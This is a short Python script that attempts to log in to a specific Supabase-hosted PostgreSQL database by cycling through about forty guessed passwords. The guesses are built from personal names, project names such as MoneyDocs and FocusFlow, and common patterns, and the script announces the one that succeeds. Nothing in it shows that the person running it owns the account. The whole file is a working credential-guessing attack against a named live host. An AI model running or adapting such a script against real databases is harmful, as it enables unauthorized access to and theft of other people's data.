import psycopg2
import time

host = "aws-0-ap-northeast-1.pooler.supabase.com"
user = "postgres.qtcncebuochelpgwqthx"
dbname = "postgres"
port = 6543

passwords = [
    "Snowy123",
    "Snowy@123",
    "snowy123",
    "Medora123",
    "Medora@123",
    "medora123",
    "Medora1402",
    "Medora@1402",
    "medora1402",
    "medora@1402",
    "Ayaan123",
    "Ayaan@123",
    "ayaansanadi123",
    "AyaanSanadi123",
    "AyaanSanadi@123",
    "postgres",
    "postgres123",
    "postgres@123",
    "MoneyDocs123",
    "MoneyDocs@123",
    "moneydocs123",
    "moneydocs@123",
    "MoneyDocsDecoded",
    "MoneyDocsDecoded123",
    "MoneyDocsDecoded@123",
    "Decoded123",
    "Decoded@123",
    "Hackathon123",
    "Hackathon@123",
    "hackathon123",
    "Hackathon2024",
    "Hackathon2025",
    "Hackathon2026",
    "FocusFlow123",
    "FocusFlow@123",
    "Password123",
    "Password@123",
    "admin123",
    "admin@123",
    "qtcncebuochelpgwqthx"
]

for pwd in passwords:
    try:
        conn = psycopg2.connect(
            host=host,
            user=user,
            password=pwd,
            dbname=dbname,
            port=port,
            connect_timeout=4,
            sslmode="require"
        )
        print(f"\n************************************************")
        print(f"SUCCESS! The PostgreSQL password is: {pwd}")
        print(f"************************************************\n", flush=True)
        conn.close()
        break
    except psycopg2.OperationalError as e:
        msg = str(e).strip().splitlines()[0]
        print(f"Pwd {pwd:20}: {msg}")
    time.sleep(0.2)
